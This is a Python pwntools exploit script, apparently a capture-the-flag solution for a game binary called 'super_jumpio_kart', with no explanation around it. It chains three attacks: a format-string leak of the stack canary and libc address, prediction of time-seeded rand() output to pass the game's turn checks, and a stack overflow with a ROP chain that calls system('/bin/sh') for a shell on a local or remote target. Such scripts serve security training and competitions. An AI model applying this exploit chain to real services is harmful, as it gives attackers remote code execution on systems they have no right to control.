#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./super_jumpio_kart")
    if args.GDB:
        gdb.attach(r,'brva 0x188f')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))


sla(">","4")
sla(":","%9$p.%12$p.")
ru("with: ")
canary = int(ru("."), 16)
libc = int(ru("."), 16) - 0x203b20
leak("libc",hex(libc))
leak("canary",hex(canary))
pop_rdi = libc + 0x10f75b
system = libc + 0x58740
bin_sh = libc + 0x1cb42f
ru("crashing!")
from ctypes import cdll, c_int
libc = cdll.LoadLibrary("glibc/libc.so.6")
v10 = ["L", "R"]

# Predict 7 turns, sometimes might be wrong just run again
# but it will work most of the time
for i in range(7):
    seed = int(time.time())
    libc.srand(c_int(seed))
    v6 = libc.rand() % 2
    sla("ahead: ", v10[v6])
sla("Up?? (y/n)", "y")
sla("your victory:",cyclic(72)+p64(canary)+p64(0x777)*3+p64(pop_rdi)+p64(bin_sh)+p64(pop_rdi+1)+p64(system))
r.interactive()
